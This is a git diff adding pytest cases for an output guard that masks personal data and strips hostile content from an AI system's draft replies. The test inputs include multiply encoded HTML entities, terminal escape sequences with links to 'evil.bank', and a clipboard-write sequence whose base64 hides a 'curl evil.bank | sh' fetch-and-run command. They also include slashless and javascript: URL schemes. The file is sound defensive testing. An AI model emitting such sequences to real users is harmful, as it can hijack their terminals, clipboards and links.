@@ -159,7 +159,7 @@ def test_output_injection_scan(detector, draft, kind) -> None:
         "The share of orders with a saved address rose to 64%.",
         "We will send the export to your downloads folder.",
         "Your report was saved as 'Q1 brand review'.",
-        "Open rate is not tracked in this dataset.",
+        "Source rate is not tracked in this dataset.",
     ],
 )
 def test_output_injection_scan_negatives(detector, draft) -> None:
@@ -586,6 +586,18 @@ class _Passthrough:
         "&#47;" * 20_000,
         "\\/" * 33_333,
         "](" * 50_000,
+        # Re-review round 3: terminal control, encoding layers, slashless schemes.
+        "\x1b]8;;" * 16_666,
+        "\x1b[" * 50_000,
+        "\x9d" * 100_000,
+        "\x1b" * 100_000,
+        "\x08" * 100_000,
+        "&amp;" * 20_000,
+        "&amp;amp;amp;#47;" * 5_000,
+        "&a" * 50_000,
+        "\\" * 50_000,
+        "http:a" * 16_666,
+        "http:a." * 14_285,
     ],
     ids=lambda d: repr(d[:12]),
 )
@@ -740,3 +752,151 @@ def test_output_guard_reports_pre_url_pii_masks(detector) -> None:
     v = guard("Buyer qv@203.0.113.9 or qv@www.example.org.", _Passthrough())
     assert v.text == "Buyer <EMAIL> or <EMAIL>."
     assert output.OutputEvent(output.PII_REDACTED, "source=detector types=EMAIL") in v.events
+
+
+# --- Re-review round 3: encoding layers (P1), terminal control (T1), "http:host" (L2) ------
+
+
+def _amp(s: str, n: int) -> str:
+    """``s`` with its "&" HTML-encoded ``n`` more times ("&#118;" -> "&amp;#118;" ...)."""
+    for _ in range(n):
+        s = s.replace("&", "&amp;")
+    return s
+
+
+@pytest.mark.parametrize("layers", range(6))
+def test_output_guard_email_encoded_n_times_is_masked_or_refused(detector, layers) -> None:
+    # "&#118;" is "v": the renderer would decode the last layer the regexes never saw.
+    draft = "Top buyer: q" + _amp("&#118;", layers) + "@example.org"
+    v = guard(draft, detector)
+    if v.allowed:
+        assert v.text == "Top buyer: <EMAIL>"
+    else:
+        assert_refused(v, output.OUTPUT_ENCODING, draft)
+    assert "@" not in v.text and "&#" not in v.text
+
+
+@pytest.mark.parametrize("layers", range(6))
+def test_output_guard_phone_encoded_n_times_is_masked_or_refused(detector, layers) -> None:
+    v = guard("Call +1 415 555 01" + _amp("&#51;", layers) + "4", detector)
+    assert v.text in ("Call <PHONE>", REFUSAL_TEXT)
+    assert "555" not in v.text and "&#" not in v.text
+
+
+@pytest.mark.parametrize("layers", range(6))
+def test_output_guard_tool_value_encoded_n_times_is_masked_or_refused(detector, layers) -> None:
+    rows = ["first_name,last_name\nQuillon,Vasterby\n"]
+    draft = "The top buyer is Quill" + _amp("&#111;", layers) + "n Vasterby."
+    v = guard(draft, detector, tool_results=rows)
+    assert "Quill" not in v.text and "Vasterby" not in v.text and "&#" not in v.text
+
+
+def test_output_guard_refuses_encoding_past_the_cap(detector) -> None:
+    draft = "See " + _amp("&#47;", output._MAX_DECODE_PASSES) + "x"
+    v = guard(draft, detector)
+    assert_refused(v, output.OUTPUT_ENCODING, draft)
+    assert v.events == (output.OutputEvent(output.OUTPUT_ENCODING, "max_passes=4"),)
+
+
+@pytest.mark.parametrize(
+    ("draft", "expected"),
+    [
+        ("Outerwear & Coats sold 10 units.", "Outerwear & Coats sold 10 units."),
+        ("AT&T and R&D, a && b.", "AT&T and R&D, a && b."),
+        ("Use `a &amp; b`.", "Use `a & b`."),  # decoded once; the bare "&" stays bare
+        ("Literal &unknownentity; here", "Literal &amp;unknownentity; here"),
+        ("Bad ref &#xZZ; here", "Bad ref &amp;#xZZ; here"),
+        ("Path C:\\data\\x", "Path C:\\data\\x"),  # backslash before a letter is kept
+    ],
+)
+def test_output_guard_escapes_what_a_renderer_would_decode(detector, draft, expected) -> None:
+    v = guard(draft, _Passthrough())
+    assert v.allowed and v.text == expected
+
+
+def test_output_guard_escapes_backslash_before_punctuation(monkeypatch) -> None:
+    # Normalisation leaves none behind; if a later step ever did, it is escaped again.
+    scrub = pii.scrub_output
+    monkeypatch.setattr(output.pii, "scrub_output", lambda t, d: scrub(t + "\\_", d))
+    v = guard("Total 10", _Passthrough())
+    assert v.text == "Total 10\\\\_"
+
+
+def test_output_guard_blocks_when_escaping_grows_past_the_cap(monkeypatch) -> None:
+    scrub = pii.scrub_output
+    monkeypatch.setattr(output.pii, "scrub_output", lambda t, d: scrub("&#" * 50_000, d))
+    assert_refused(guard("Total 10", _Passthrough()), output.OUTPUT_TOO_LONG)
+
+
+@pytest.mark.parametrize(
+    ("draft", "expected"),
+    [
+        ("\x1b]8;;http:evil.bank\x1b\\click here\x1b]8;;\x1b\\", "click here"),  # OSC 8
+        ("\x1b]8;;https://evil.bank/c\x07click\x1b]8;;\x07", "click"),
+        ("Done.\x1b]52;c;Y3VybCBldmlsLmJhbmsgfCBzaA==\x07", "Done."),  # OSC 52 clipboard
+        ("\x1b[2J\x1b[HFake prompt $ ", "Fake prompt $ "),  # CSI clear screen
+        ("\x9d8;;http:evil.bank\x9cclick", "click"),  # C1 OSC
+        ("\x9b2Jx", "x"),  # C1 CSI
+        ("Total 10\x08\x08\x0899 rows", "Total 1099 rows"),  # backspace digit spoofing
+        ("a\x1bcb", "ab"),  # ESC c (reset)
+        ("a\x1b(0b", "ab"),  # charset designation
+        ("a\x7fb\x00c\rd\x85e", "abcde"),  # DEL, NUL, CR, C1 NEL
+        ("&#27;]8;;http:evil.bank&#27;\\x&#27;]8;;&#27;\\", None),  # ESC entity: dropped
+        ("\x1b]8;;http:evil.bank", ""),  # unterminated: payload dropped to the end
+        ("abc\u202edcba", "abcdcba"),  # bidi override (Cf)
+    ],
+)
+def test_output_guard_drops_terminal_control(detector, draft, expected) -> None:
+    v = guard(draft, detector)
+    assert v.allowed and (expected is None or v.text == expected)
+    assert not any(ord(c) < 32 and c not in "\n\t" or 0x7F <= ord(c) <= 0x9F for c in v.text)
+    assert "evil" not in v.text
+
+
+def test_output_guard_keeps_newline_and_tab_and_reports_controls(detector) -> None:
+    v = guard("a\tb\nc\x1b[31md", detector)
+    assert v.text == "a\tb\ncd"
+    assert output.OutputEvent(output.CONTROL_STRIPPED, "count=1") in v.events
+
+
+@pytest.mark.parametrize(
+    "draft",
+    [
+        "Source http:evil.bank/c now",
+        "Source http:evil.bank now",
+        "Source https:evil.bank/c?d=4512 now",
+        "Source ftp:evil.bank/c now",
+        "Source file:evil.bank/c now",
+        "Source hxxp:evil.bank/c now",
+        "Source http[:]evil.bank/c now",
+        "Source javascript:alert(1) now",
+        "Source HTTP:Evil.Bank now",
+    ],
+)
+def test_output_guard_strips_scheme_without_slashes(detector, draft) -> None:
+    v = guard(draft, detector)
+    assert v.text.startswith(f"Source {URL_TOKEN}") and v.text.endswith(" now")
+    assert "evil" not in v.text.lower() and "alert" not in v.text
+
+
+@pytest.mark.parametrize(
+    "draft",
+    [
+        "[a](http:evil.bank/c)",
+        "<http:evil.bank>",
+        "[a]: http:evil.bank/c",
+        "see <http:evil.bank/c>",
+    ],
+)
+def test_output_guard_neutralises_slashless_links(detector, draft) -> None:
+    pytest.importorskip("markdown_it")
+    v = guard(draft, detector)
+    assert "evil" not in v.text and _md_links(v.text) == []
+
+
+@pytest.mark.parametrize(
+    "draft",
+    ["Ratio 3:2 overall", "Time 10:30 today", "Note: http is a protocol.", "Use https: always"],
+)
+def test_output_guard_scheme_word_without_host_is_kept(detector, draft) -> None:
+    assert guard(draft, detector).text == draft
